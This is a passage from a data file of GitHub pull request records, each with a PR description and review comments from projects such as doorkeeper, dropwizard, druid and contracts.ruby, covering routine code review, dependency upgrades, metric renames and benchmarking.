`reuse_access_token` will allow you to share access token between multiple devices for the same resource owner, same application.","[""Am I supposed to follow the bot's instructions? It would make inconsistency with existing code base - let me know what I should do or should not."", 'Yes, please follow @houndci instructions when it makes it better. We are actually discussing following the styleguide from now on in: https://github.com/doorkeeper-gem/doorkeeper/pull/390. Will now review your PR.', ""Just merged a style big PR, we'll need to rebase. Also now houndci is in accordance with the style of doorkeeper's codebase (mostly!)."", 'OK I think I\'ve fixed everything except some ""line too long"" comments, and the arg for `find_or_create_for`. Can you take a look again?', 'Thank you!', 'Awesome, thanks! :+1: ', ""Hey @tute , what's keeping this release on hold? I really like to use this feature. If there's anything I can help, let me know."", ""Nothing keeping it on hold, next week I'll release off of this master. Meanwhile you can safely bundle from github's master branch. Thank you!"", ""Oh yes, I've bundled with the latest commit and now it works. :) Thanks!"", 'Just released v1.3.0. Cheers!', 'Awesome, thanks!']"
221,doorkeeper-gem/doorkeeper,411.0,"Rspec 2.99 give many deprecation tips, cleaned them
also upgrade some too old development dependencies",['THANK YOU. :smiley: ']
222,doorkeeper-gem/doorkeeper,629.0,"`rspec-rails` support `rails` 4.2 starts at version `3.1`, so I upgrade it and move all old `rspec` syntax to new. the changes seems too big.","[""I quick reviewed all test cases, found lots of cases have no assertion, add `skip 'No assertion.'` to mask, maybe I'm wrong, I'm not skilled on testing."", 'This is great work, thank you @jasl! Left many comments to address.', 'I comment some, but maybe I need a long time to understand these cases.', ""Sorry I can't work for doorkeeper this weekends(my company's site is under attacking), but I would reply your comments ASAP."", ""No worries @jasl, thanks for your work so far! I incorporated your commit in a new PR (https://github.com/doorkeeper-gem/doorkeeper/pull/635), and will apply my comments on top of it. Will close this Pr in favor of that one.\r\n\r\nBest with your company's website!""]"
223,dradis/dradisframework,105.0,"We want to be able to provide the app as a ""download and run"" package with Traveling Ruby and a few tweaks were needed, mainly:

* Use versions of native gems (e.g. nokogiri, sqlite3, etc.) supported by Traveling Ruby.
* Add packaging scripts.


See:
  https://github.com/phusion/traveling-ruby",['Merge traveling-ruby packaging work']
224,dropwizard/dropwizard,874.0,"Fix #861, Fix #857, Fix #849, Fix #789, Fix #863

Add our own version that uses the pre-configured Apache HTTP client.

Dropwizard has a stable and mature Apache HTTP client with an extensive configuration. Rather than trying to simulate configuration with Jersey properties, we can just use a built Apache client and write a custom connector that does a glue work between Jersey and Apache client's abstractions.

With this approach we have a single place of configuration. That reduces burden of supporting a new feature both in Apache and Jersey clients.

This also reverts the approach taken in #791 with a base class that contains common configuration.

It would be great if someone could try to test this more thoroughly because I did only sanity tests.","['\n[![Coverage Status](https://coveralls.io/builds/1856593/badge)](https://coveralls.io/builds/1856593)\n\nCoverage increased (+0.21%) to 67.48% when pulling **75faffdf1015127f89d97a555469e2d96aaa2fa9 on arteam:dropwizard_jersey_apache** into **c6b4c3257b22d47c1fc11890fdb5ea323e34ab81 on dropwizard:master**.\n', '+1', '+1', '\n[![Coverage Status](https://coveralls.io/builds/1886032/badge)](https://coveralls.io/builds/1886032)\n\nCoverage increased (+0.21%) to 67.48% when pulling **3ec7f18fc5ee59520706adae624f05e5c8729e3c on arteam:dropwizard_jersey_apache** into **49fe243f0e472fea34355a183fba253409a68520 on dropwizard:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1886071/badge)](https://coveralls.io/builds/1886071)\n\nCoverage increased (+0.21%) to 67.48% when pulling **48fdb73ebb24aafd4ed18e968e01363ea6abada0 on arteam:dropwizard_jersey_apache** into **49fe243f0e472fea34355a183fba253409a68520 on dropwizard:master**.\n', 'LGTM', 'Thanks, @arteam! And thanks @Trundle for reviewing.']"
225,dropwizard/dropwizard,958.0,"If a database commit fails, it's better not to rethrow an Hibernate exception in the original form, but
wrap it as a MappableException.

This way users can map sql exceptions to web responses and derive a business value from the
database validation checks.

Resolve #949",['LGTM.']
226,druid-io/druid,1031.0,"DataSourceMetadata query - 
expose maxIngestedEventTime for dataSource","['Victim of #1032', 'This is failing travis-ci', 'travis CI failed due to #1032, passing with Java7', 'Can we please require rebasing pull-requests going forward to avoid needless cluttering of the commit history? Merge commits are especially annoying because they make it hard to understand the changes made.']"
227,druid-io/druid,1027.0,"* Was encountering weird errors when fast writes were coming in while queries were happening.


Primitive benchmarks on locking mechanism indicate twice as fast as concurrent hash map. Working on better tests","['Difference to 0.6.x:\r\n\r\nIn 0.6.x the events were placed based on `key` into `facts` rather than on a separate `aggList`. \r\n\r\nNote that in 0.7.x, the facts table is to assist in finding the offset into the on/off heap data store which houses the actual data. This is different than 0.6.x where it stored the data itself.', 'Travis CI failed java8 only', '@fjy @cheddar @xvrl (and @gianm for fyi): I find the cases in the unit test kind of odd. identical rows when added cause the aggregates to fire multiple times. Specifically, having 4 threads adding the exact same rows yields 4x the (longSum/doubleSum) aggregates of 1 thread adding the rows. Is this the behavior that is desired?\r\n\r\nMy initial inclination is that posting identical rows to the incremental index would be idempotent. which it currently is not.', 'If adding the same number of rows using 1 or 4 threads yields different results, that would be a major bug. I wonder if it has to do anything with the switch to using a ThreadLocal inputRow for aggregation in 0.7.', ""@xvrl It's adding the identical rows in 1 vs 4 threads.\r\n\r\nFor example, if your pool of rows is (row1, row2, row3) then adding that *set* of rows in 1 thread, or adding in *each* of 4 concurrent threads yields different results. I haven't attempted to add the set *among* 4 threads."", 'in ""each"" I mean Thread1{(row1,row2,row3)}  Thread2{(row1,row2,row3)}    Thread3{(row1,row2,row3)}  for ""among"" was meaning Thread1{(row1)}  Thread2{(row2)}    Thread3{(row3)}', ""I'm thinking the onheap might work well as an on heap bytearray backed buffer of some kind, then both on and off can share a lot more logic."", 'CI failed on java8 again...', 'Again, TravisCI failed on Java8 (fine on java7)', 'Victim of #1032']"
228,druid-io/druid,1011.0,"Update of #979 
Asynchronous logging could be enabled for select chatty classes:
* io.druid.client.ServerInventoryView
* io.druid.client.BatchServerInventoryView
* io.druid.curator.inventory.CuratorInventoryManager
* com.metamx.http.client.pool.ChannelResourceFactory","['@fjy / @xvrl : Is this basically waiting to make sure 0.7.x is stable in our test env before bringing in more changes? or are there more comments?', 'I would prefer to leave async logging disabled by default as it currently is and just give an example of how to configure it in the config file? By default I believe it is more important to have full logs in case of a crash rather than having good performance with debug logs enabled.', '@xvrl : Reverted default to prior behavior and added documentation on how to modify behavior if desired.', 'I did move some comments from INFO --> DEBUG in some of the chatty classes, @xvrl : would you rather have them back to INFO?']"
229,druid-io/druid,1076.0,This should help reduce GC pressure form ThreadLocals on nodes with lots of indices. It may also slightly help with performance thanks to less branching.,"['Two things on this commit.\r\n\r\n1) I\'d like to request that we don\'t merge it until I\'ve had a chance to merge in our current working branch.  I\'ve already backed out the ThreadLocal changes there and am worried about losing important things in figuring out the merge conflicts\r\n\r\n2) I think this patch takes a step closer to a less-invasive strategy for implementing the reuse of the buffer as well caching.  But, I think there\'s a cleaner implementation yet.  Specifically, I propose adding a method to the Indexed interface which is something like\r\n\r\n```\r\npublic Indexed singleThreaded()\r\n```\r\n\r\nThat essentially returns an object which is ""optimized"" given the knowledge that it is running off of a single thread.  That method call could essentially create a new Indexed object that wraps a reference to a single copy of the ByteBuffer which it reuses.\r\n\r\nWe can then move the caching behavior completely out of the Indexed and use composition.  I.e. make a `CachingIndexed` which wraps the object in an implementation that does caching.\r\n\r\nThis structure has added benefits in that the ColumnConfig no longer needs to be pushed down so far into the segment loading code and can instead be used at a much higher level.  Also, each part should be easier to unit test, I think.\r\n\r\nLastly, just a note, but if you are ever taking one interface, attaching the ""Closeable"" interface to it and making a new ""CloseableXYZ"" interface, you are going to eventually leak resources.  As a pattern, it should never be followed.  The reason is that implementations of `CloseableXYZ` are also implementations of `XYZ`, at some point they will be passed as just an `XYZ` instead of a `CloseableXYZ` losing the information that there is a `close()` method that needs to be dealt with.  If the interface needs a `close()` method, then ***all*** implementations of it need a close() method.', '@cheddar I believe the latest revision addresses your comments', 'While this PR is a step forward, two more things should be done:\r\n\r\n1) Adding `singleThreaded` to the Indexed interface and moving the usage code out of the Column\r\n2) The removal of `ColumnConfig` and all of the cruft it added to the Index loading code\r\n\r\nRight now, this PR is mixing concerns by putting all of the caching into the columns ', 'Regarding 1), the column cache currently relies on the size of values in the buffer as a shorthand to determine object sizes, so it is currently tied to GenericIndexed, and so it might not be straightforward to add `singleThreaded` to the Indexed interface.\r\n\r\nI would prefer to do 2) as a separate PR to make the change in behavior clear. ', ""+1 while I agree with @cheddar that some of this logic should be reworked, I think this PR makes progress on fixing an existing memory leak and we can work on some of @cheddar's comments in a future PR. I would want an issue filed for this work though, so we don't just forget about it."", ""Hrm, ok, yeah, I can see your point.  I'm down with doing this for now and then following up in another PR to clean up various aspects."", 'Please remember to file an issue.']"
230,druid-io/druid,1079.0,"Full list of Druid dependencies:
https://docs.google.com/a/metamarkets.com/spreadsheets/d/1lF4QvnKrqRBXo3X6EFdcaJ6LTYRviOYSPBYDFh2ksg8/edit#gid=0

This PR does the following:
- Removes LGPL and GPL runtime dependencies
- updates hibernate-validator to a version where it is apache 2 licensed
- Includes the license maven plugin (http://mojo.codehaus.org/license-maven-plugin/ - GPL3) to generate licenses of all dependencies
- edited alphanum topN sort",['how about using https://github.com/amjjd/java-alphanum for alphanumeric sort?']
231,druid-io/druid,1141.0,,[]
232,druid-io/druid,1182.0,,"['\n[![Coverage Status](https://coveralls.io/builds/2083978/badge)](https://coveralls.io/builds/2083978)\n\nCoverage decreased (-0.05%) to 52.09% when pulling **891c1913e3a99d65d9c4480750b2757884540915 on better-docs** into **e9b38f4abe824ea47c10a93e753a7860121f2d50 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2085456/badge)](https://coveralls.io/builds/2085456)\n\nCoverage increased (+0.14%) to 52.21% when pulling **064d65a009c88f1fed1b4dd98671c5e9e4a43b7c on better-docs** into **0b467624ec5aae95e4bae3f120daea41f447b3a7 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2085490/badge)](https://coveralls.io/builds/2085490)\n\nCoverage increased (+0.04%) to 52.11% when pulling **064d65a009c88f1fed1b4dd98671c5e9e4a43b7c on better-docs** into **0b467624ec5aae95e4bae3f120daea41f447b3a7 on master**.\n']"
233,druid-io/druid,1044.0,"- Ensure names for aggregators and post-aggregators are unique
- Fixes #1045 by not allowing the same name for both post-aggregators and aggregators
- Optimizes post-aggregator calculation for groupBy","['Fixes #1045 via https://github.com/metamx/druid/commit/60e065db5be152c1f6674322e3e032df16018341', '+1', '@xvrl : can this be a 0.7.1 fix?', 'yup, added it to 0.7.1\n\nOn Mon, Feb 23, 2015 at 8:53 AM, Charles Allen <notifications@github.com>\nwrote:\n\n> @xvrl <https://github.com/xvrl> : can this be a 0.7.1 fix?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/druid-io/druid/pull/1044#issuecomment-75581837>.\n>\n', 'Can I propose a simpler fix of just throwing a meaningful exception when agg/postagg match?', '@fjy : That is possible, but be aware that the current proposed fix overwrites the prior values with new ones. This means that if someone has complex aggregations and some other post-aggregations, the post aggs will overwrite the aggregators in the results set, this saves on ser/de when sending back to the client.', '@cheddar @himanshug @xvrl Any thoughts on this one? In particular with my last set of comments.', 'I think I agree with @fjy in keeping it simple and just not allowing aggregator and post-aggregator of same names. Semantics are then simpler to understand/explain.\r\n\r\n@drcrallen savings on serde, if required, can be attained by fixing #688', '@cheddar  / @fjy  / @himanshug / @xvrl \r\nThis changes behavior of the query engine and could break existing queries, but now implements the behavior as suggested by @fjy  / @himanshug', 'LGTM besides the minor comment.', 'To be clear, the ""fix"" for the issue is still in the PR, so the underlying logic *can* support group by queries where the aggregate and post aggregate are named the same but now they simply refuse to.', '\n[![Coverage Status](https://coveralls.io/builds/2084144/badge)](https://coveralls.io/builds/2084144)\n\nCoverage decreased (-0.02%) to 52.11% when pulling **4393876087cf55b0fb64fae4a44bab5cc3040704 on metamx:groupby-postagg-naming-bug** into **c7ec8ba15b68b171bf7931505e6f95aa8c47d6e4 on druid-io:master**.\n', 'Modified this a little to also do the same check for aggregators (that aggregator names must be unique)', '\n[![Coverage Status](https://coveralls.io/builds/2085811/badge)](https://coveralls.io/builds/2085811)\n\nCoverage increased (+0.01%) to 52.13% when pulling **92de15d6b2fa7ae3a738e8515046bdc68f8a7883 on metamx:groupby-postagg-naming-bug** into **9f242ed1ba09ce1f91bf150327fad046c5ce7064 on druid-io:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2085683/badge)](https://coveralls.io/builds/2085683)\n\nCoverage increased (+0.06%) to 52.18% when pulling **e92e664800b4e7d9b37940e1e71c6e30dbd6fb3c on metamx:groupby-postagg-naming-bug** into **9f242ed1ba09ce1f91bf150327fad046c5ce7064 on druid-io:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2086365/badge)](https://coveralls.io/builds/2086365)\n\nCoverage decreased (-0.04%) to 52.08% when pulling **f6778651a0bf42525800bc25e7ea31a76376eaf2 on metamx:groupby-postagg-naming-bug** into **9f242ed1ba09ce1f91bf150327fad046c5ce7064 on druid-io:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2086384/badge)](https://coveralls.io/builds/2086384)\n\nCoverage increased (+0.02%) to 52.14% when pulling **f6778651a0bf42525800bc25e7ea31a76376eaf2 on metamx:groupby-postagg-naming-bug** into **9f242ed1ba09ce1f91bf150327fad046c5ce7064 on druid-io:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2086552/badge)](https://coveralls.io/builds/2086552)\n\nCoverage decreased (-0.02%) to 52.1% when pulling **1ee7e4898a7b246e71298ca6f5513904e84b7cd1 on metamx:groupby-postagg-naming-bug** into **9f242ed1ba09ce1f91bf150327fad046c5ce7064 on druid-io:master**.\n']"
234,druid-io/druid,1246.0,"Kafka + Samza + Druid

Also Hadoop, for now.

This has overlap with the Druid paper.

Creating this PR so other authors can edit it.",[]
235,druid-io/druid,1208.0,"This is based on the discussion in the dev forums:

https://groups.google.com/forum/#!topic/druid-development/weccuTb2W54

This does not yet include doc updates.

This will be a backwards incompatible change for metrics.

The following changes will exist:
indexer/segment/bytes->segment/added/bytes
indexer/segmentMoved/byte->segment/moved/bytes
indexer/segmentNuked/bytes->segment/nuked/bytes
indexer/time/run/millis->task/run/time
exec/backlog->segment/scan/pending
coordinator/*->segment/*
server/*->segment/*
events/thrownAway->ingest/events/thrownAway
events/unparseable->ingest/events/unparseable
rows/output->ingest/rows/ouput
persists/num->ingest/persists/count
persists/time->ingest/persists/time
persists/backPressure->ingest/persists/backPressure
failed/persists->ingest/persists/failed
failed/handoff->ingest/handoff/failed

request/time->query/time
broker: query/time->query/node/time
historical/rt: query/time->query/segment/time
query/wait->query/wait/time

query/intervalChunk/time
query/segmentAndCache/time

","['There are already concerns about the size of Metrics data. Do you have any numbers on how/if this changes data sizes?', '@fjy would you mind also submitting a corresponding PR to https://github.com/metamx/server-metrics, to make SysMonitor and JvmMonitor schemaless as well?', ""I'm happy to merge this once:\r\n- [ ] everyone is ok with making the backwards incompatible change in metrics. @cheddar, thoughts?\r\n- [ ] remaining issues with exceptions being thrown are resolved"", '@xvrl @himanshug Addressed all code review comments.', '@xvrl @himanshug Any thoughts?', 'LGTM, @himanshug any other comments?', 'LGTM', 'Looks like we need to update docs / configs to rename `ServerMonitor` to `HistoricalMetricsMonitor`']"
236,druid-io/druid,1345.0,"- Corrected the warn message in RealtimePlumber class
- Added unit test for DetermineHashedPartitionsJob class. Sample data is mostly similar to druid.sample.tsv apart from the fact that it is smaller in size and there are duplicate events for a Time Bucket to test HyperLogLog unique count feature.
- Added unit test for LocalDataSegmentPusher
- Added unit test for DatasourcesResource","['@pjain1 Thanks for the contrib :)\r\n\r\nDo you mind filling out our CLA?\r\nhttp://druid.io/community/cla.html', '@fjy @pjain1 should be in our corp CLA. Please let me know if he is not there already.', '@xvrl can you check the corp CLA?', ':+1:  Can you squash the commits and I can merge', 'Done.']"
237,druid-io/druid,1395.0,,"['@drcrallen @nishantmonu51 @cheddar @himanshug @xvrl @gianm \r\n\r\nThis is a small improvement and should be straightforward to CR. Can someone take a look?', 'LGTM', ""Overall these are nice changes. I would like to see the constructor statements at the debug level if possible. Also if the push log statements could include the target directory that would be awesome. But if they cannot because you are explicitly trying to log before the output path resolving statement, then that's fine but it would be nice to have that noted in the PR."", 'Given the general support for more default logging I concede the info level logging. I am still interested in if the paths can be included in the info statements though.', '@drcrallen I updated the PR', ':+1: ', '+1']"
238,druid-io/druid,1351.0,"* Allows submitting conversion tasks through Hadoop
* Allows submitting conversion tasks through the indexing service for Hadoop
* Adds unit tests for the hadoop conversion task. 
* Small changes to SQLMetadataSegmentManager to facilitate better unit tests
* Fixes https://github.com/druid-io/druid/issues/1363

The following should merge first:
https://github.com/druid-io/druid/pull/1367 (done)
https://github.com/druid-io/druid/pull/1366 (done)
https://github.com/druid-io/druid/pull/1428 (done)

Then I'll rebase this one.","['If I\'m understanding this correctly, this looks like a way to run a conversion task over Hadoop MR.  That is, logically, it is executing tasks using Hadoop MR (and ultimately YARN) as the task manager instead of using whatever the Indexing Service is using.\r\n\r\nI\'m not against this, but I also kinda wonder if we shouldn\'t make a generic ""run tasks on hadoop"" job and then have the conversion task be a part of that?', '@cheddar : Yes, that is a longer goal.  Some of the aspects of this PR will be combined with the hadoop task once this has proven stable. A future goal would be to make a better task container that can run on the indexing service, yarn, or mesos.', ""I had discussed with @xvrl briefly about what to do regarding the metadata update.\r\n\r\nI'm in agreement with his point of view that only allowing the task to work as an indexing service task (and *NOT* as a standalone hadoop job) would greatly simply things overall.\r\n\r\n@cheddar : is there any objection to simply having this as ONLY an indexing task? (EDIT: indexing task which spawns a hadoop job, meaning it requires the indexing service to run on Hadoop)"", ""The existing conversion tasks is also not standalone, so I don't see why this one would need to be.\r\n\r\nIt would also greatly simplify this PR to remove all metadata rated stuff, since that's unrelated to the task itself if we remove the standalone option. "", '@cheddar / @xvrl : I removed the metadata updating in the job and left it as ONLY an indexing task.\r\n\r\nI also fixed the last known bug (https://github.com/druid-io/druid/issues/1363) that I have encountered in local tests.', 'Travis failed due to https://github.com/druid-io/druid/issues/1393 restarting', '@cheddar / @xvrl This has been sitting here for 2 days and is blocking stuff on my side. Please either comment or merge.', '+1', 'Conversations directly with FJ and others who have commented on this PR show that everyone is generally ok with this, so I went ahead and merged.']"
239,druid-io/druid,1388.0,"moves marking of lazy workers to remote task runner, 
prevents race described in #1360, #784 by removing workers from available zkWorkers when marking them as lazy before resource management strategy can terminate them.  ","['@drcrallen @fjy @xvrl @gianm , any comments on this ? ', 'I already +1 it', ""I'm good here once travis is green :+1: "", 'LGTM']"
240,druid-io/druid,1434.0,"* Fixes https://github.com/druid-io/druid/issues/1433
* Works arround https://issues.apache.org/jira/browse/HADOOP-10643
* Reverts to the prior method of renaming",['LGTM']
241,druid-io/druid,1471.0,This is meant to replace what was removed in #1467 assuming performance is not affected,"[""if this looks good, I'll add docs"", ':+1:', ':+1: ', 'ok, let me add docs then', 'It would be nice, however, if this is not merged until a perf test is run on it.', 'Yes, we should definitely do some performance testing before merging.', '+1', '@drcrallen did you identify the slowness cause for #1467\r\n\r\nalso looking at HttpPostEmitter.emit(..) which is potentially the reason for slowness. I think first synchronized at line-142 can be removed without any impact on the behavior.\r\nAnd, second synchronized at line-166 can be removed with the understanding that in the worst case of concurrent calls we might end up buffering more events than configured. so config.getMaxBufferSize() becomes more of a hint than a strict limit. In this case, that looks ok to me than compromising the performance of druid in potentially many places where metrics are being emitted.', '+1', '@himanshug I did not identify the exact bottleneck other than ""somewhere in the http emitter""', '@xvrl @drcrallen are we able to merge this?', '@fjy Gathering data right now. Should know today sometime.', 'Ok, performance tests are coming back fine.']"
242,druid-io/druid,1475.0,,"['+1', '@fjy @xvrl in the syncup, we had a small discussion regarding whether to use mysql in the examples or not. I consider the example setup a experimentation/prototype phase setup and it should be as simple as possible so using derby should be fine.\r\nPlease merge if you agree or just close if you believe we should stick to using mysql in the examples.', 'close and reopen to rebuild']"
243,egonSchiele/contracts.ruby,111.0,"I'm adding this PR to spur discussion. To me this code is more readable. But there is a real performance hit. Old, optimized code:

                                         user     system      total        real
    testing add                      0.370000   0.000000   0.370000 (  0.371734)
    testing contracts add            4.250000   0.000000   4.250000 (  4.249101)

New, readable code:

                                         user     system      total        real
    testing add                      0.360000   0.000000   0.360000 (  0.364561)
    testing contracts add            9.000000   0.020000   9.020000 (  9.014563)

It is twice as slow on my machine, and much much slower than `add` without contracts. Should I optimize for readability or speed here? WDYT @waterlink ?","['Also pinging @sfcgeorge since you just touched this code...any strong feelings?', ""Over all I like your changes, you've made some sensible refactors and simplified things I wondered if could be simplified. I made a few picky code comments but it's a net positive from me, reading through it was easier to make sense of. Really nice.\r\n\r\nThe slow down is worrying though. Over 2x slower is a big hit. My feeling is that this is a low level tool where it should simply be possible to add it to an existing project with minimal impact (on anything; coding style, structure, speed etc).\r\n\r\nPerhaps re-optimize from here\xe2\x80\x94certainly a number of your changes can stay\xe2\x80\x94changing the just the slowest bottlenecks for less readable but faster alternatives. At least it's mainly just this method that needs to be optimised; other parts of the library can be coded beautifully without worry for speed as they'll only be run a handful of times. `call_with` gets run a lot.\r\n\r\nExample; The project I've added Contracts to is a design by code tool, users code `square`, `circle` etc and it gets rendered. The smallest primitive is a Node which is a light class that just wraps x, y coordinates and type (for corners, curves etc). As this is a user facing tool I use Contracts to validate the constructor for Nod, and a canvas can have thousands of nodes. Rendering large scenes can take 5 seconds. It's an extreme but real world example that sometimes Contracts will be added to simple methods that get called a lot, and ideally it would still be fast."", 'This is huge improvement over readability, I would like to add a benchmark\nwith some simple IO. Like writing and reading from file, or doing something\nwith redis, or just fetching google page over the wire.\n\nHave you given a thought about code generating techniques? So that we can\ncode nice pseudo-class with bunch of small methods, but then they all will\nget inlined in one huge effective method.\nOn Mar 17, 2015 1:55 AM, ""Aditya Bhargava"" <notifications@github.com> wrote:\n\n> I\'m adding this PR to spur discussion. To me this code is more readable.\n> But there is a real performance hit. Old, optimized code:\n>\n>                                      user     system      total        real\n> testing add                      0.370000   0.000000   0.370000 (  0.371734)\n> testing contracts add            4.250000   0.000000   4.250000 (  4.249101)\n>\n> New, readable code:\n>\n>                                      user     system      total        real\n> testing add                      0.360000   0.000000   0.360000 (  0.364561)\n> testing contracts add            9.000000   0.020000   9.020000 (  9.014563)\n>\n> It is twice as slow on my machine, and much much slower than add without\n> contracts. Should I optimize for readability or speed here? WDYT\n> @waterlink <https://github.com/waterlink> ?\n> ------------------------------\n> You can view, comment on, or merge this pull request online at:\n>\n>   https://github.com/egonSchiele/contracts.ruby/pull/111\n> Commit Summary\n>\n>    - some simple refactoring, turning variables into methods.\n>    - some refactoring of call_with\n>    - small prettifying\n>    - refactoring to remove unneeded _args variable\n>    - if value is nil or \'\', nil.to_s is nothing. We need to call .inspect\n>    instead.\n>    - rename InspectWrapper class and use InspectWrapper in the built-in\n>    contracts\n>\n> File Changes\n>\n>    - *M* Gemfile\n>    <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-0>\n>    (2)\n>    - *M* Gemfile.lock\n>    <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-1>\n>    (4)\n>    - *M* lib/contracts.rb\n>    <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-2>\n>    (193)\n>    - *M* lib/contracts/builtin_contracts.rb\n>    <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-3>\n>    (8)\n>    - *M* lib/contracts/formatters.rb\n>    <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-4>\n>    (13)\n>\n> Patch Links:\n>\n>    - https://github.com/egonSchiele/contracts.ruby/pull/111.patch\n>    - https://github.com/egonSchiele/contracts.ruby/pull/111.diff\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/egonSchiele/contracts.ruby/pull/111>.\n>\n', 'BTW I have strong feelings, that gem memoizable is not needed at all, it is\na runtime dependency people will not want and it can be replaced with\nsimple `||=` or `if defined?` for nil, false aware memoizing.\nOn Mar 17, 2015 9:28 AM, ""Alexey Fedorov"" <notifications@github.com> wrote:\n\n> This is huge improvement over readability, I would like to add a benchmark\n> with some simple IO. Like writing and reading from file, or doing something\n> with redis, or just fetching google page over the wire.\n>\n> Have you given a thought about code generating techniques? So that we can\n> code nice pseudo-class with bunch of small methods, but then they all will\n> get inlined in one huge effective method.\n> On Mar 17, 2015 1:55 AM, ""Aditya Bhargava"" <notifications@github.com>\n> wrote:\n>\n> > I\'m adding this PR to spur discussion. To me this code is more readable.\n> > But there is a real performance hit. Old, optimized code:\n> >\n> > user system total real\n> > testing add 0.370000 0.000000 0.370000 ( 0.371734)\n> > testing contracts add 4.250000 0.000000 4.250000 ( 4.249101)\n> >\n> > New, readable code:\n> >\n> > user system total real\n> > testing add 0.360000 0.000000 0.360000 ( 0.364561)\n> > testing contracts add 9.000000 0.020000 9.020000 ( 9.014563)\n> >\n> > It is twice as slow on my machine, and much much slower than add without\n> > contracts. Should I optimize for readability or speed here? WDYT\n> > @waterlink <https://github.com/waterlink> ?\n> > ------------------------------\n> > You can view, comment on, or merge this pull request online at:\n> >\n> > https://github.com/egonSchiele/contracts.ruby/pull/111\n> > Commit Summary\n> >\n> > - some simple refactoring, turning variables into methods.\n> > - some refactoring of call_with\n> > - small prettifying\n> > - refactoring to remove unneeded _args variable\n> > - if value is nil or \'\', nil.to_s is nothing. We need to call .inspect\n> > instead.\n> > - rename InspectWrapper class and use InspectWrapper in the built-in\n> > contracts\n> >\n> > File Changes\n> >\n> > - *M* Gemfile\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-0>\n> > (2)\n> > - *M* Gemfile.lock\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-1>\n> > (4)\n> > - *M* lib/contracts.rb\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-2>\n> > (193)\n> > - *M* lib/contracts/builtin_contracts.rb\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-3>\n> > (8)\n> > - *M* lib/contracts/formatters.rb\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111/files#diff-4>\n> > (13)\n> >\n> > Patch Links:\n> >\n> > - https://github.com/egonSchiele/contracts.ruby/pull/111.patch\n> > - https://github.com/egonSchiele/contracts.ruby/pull/111.diff\n> >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub\n> > <https://github.com/egonSchiele/contracts.ruby/pull/111>.\n> >\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/egonSchiele/contracts.ruby/pull/111#issuecomment-82198836>\n> .\n>\n', ""Code generation is an interesting idea. I was working on something similar until I found contracts and it does work that way, `class_eval` a method definition string with all the validations done as inline if statements\xe2\x80\x94that way the result is exactly what you'd write by hand so as fast as possible. Generating that kind of code is nasty though, and I don't think it would work with our dynamic method dispatch. Nice idea for speed, but probably not practical to implement."", 'Not generating code on runtime, but actually generating Ruby file from\npseudo-ruby file.\nOn Mar 17, 2015 1:01 PM, ""Simon George"" <notifications@github.com> wrote:\n\n> Code generation is an interesting idea. I was working on something similar\n> until I found contracts and it does work that way, class_eval a method\n> definition string with all the validations done as inline if\n> statements\xe2\x80\x94that way the result is exactly what you\'d write by hand so as\n> fast as possible. Generating that kind of code is nasty though, and I don\'t\n> think it would work with our dynamic method dispatch. Nice idea for speed,\n> but probably not practical to implement.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/egonSchiele/contracts.ruby/pull/111#issuecomment-82307040>\n> .\n>\n', ""Oh I see your point, that could be pretty nice. Make the code readable, annotate methods to be inlined and run it through a tool. Some languages can do inlining with an annotation or automatically (Rubinius aparently), alas I think MRI can't. I feel like there should be a gem to do this high level Ruby => performant Ruby inlining but I can't find such a thing."", 'I would just fix all the minor code review comments in this PR and merge it. Then as a next step we can think about looking for this tool. If there is no such thing out there, we can build it. Sounds like a plan.', ""Something is strange with travis, it just doesn't want to run build.."", ""It did that for me, probably just a busy time. \r\n\r\n\r\n> On 18 Mar 2015, at 22:45, Alexey Fedorov <notifications@github.com> wrote:\r\n> \r\n> Something is strange with travis, it just doesn't want to run build..\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> \r\n"", 'LGTM from me. I think this can be merged when green.', ""Original time for refactored code:\r\n\r\n    testing add                      0.380000   0.000000   0.380000 (  0.382351)\r\n    testing contracts add            7.680000   0.010000   7.690000 (  7.702954)\r\n\r\nI changed the memoized methods back to being instance variables again, and got a big boost:\r\n\r\n    testing add                      0.380000   0.000000   0.380000 (  0.374630)\r\n    testing contracts add            4.650000   0.010000   4.660000 (  4.669573)\r\n\r\nThis refactoring still adds improvements, so I think I will merge it as-is. Like @sfcgeorge said this is a low-level library so I want it to have as little performance impact as possible. I like the idea of code generation for the future! We will just have to be careful so the code doesn't end up more complicated than before.\r\n\r\nI also added IO benchmarks (downloading a web page 100 times). As expected, contracts makes no noticeable difference there:\r\n\r\n    testing download                 2.090000   0.180000   2.270000 ( 33.597591)\r\n    testing contracts download       2.180000   0.160000   2.340000 ( 30.947244)\r\n\r\nThe goal is to be fast enough that people don't stop using contracts for performance reasons."", 'merged.', ""Great! It's fantastic that removing Memoize gave such a speed boost, and slightly surprising as it's supposed to speed things up but I guess it abstracts too much. This refactor is barely slower than before, 11.5x VS 12.5x, which is good news.\r\n\r\nCode generation still sounds interesting to me though it could add more complexity than it's worth. Definitely one to have a think about and experiment.""]"
244,electronicarts/orbit,69.0,,['']
245,embulk/embulk,180.0,It's under review. Do not merge!,"['@muga Please merge #181 to java_time_parser branch.', 'For future your work, please keep in mind that semantically unnecessary private fields (such as fail, compiledPattern, etc) are always harmful.']"
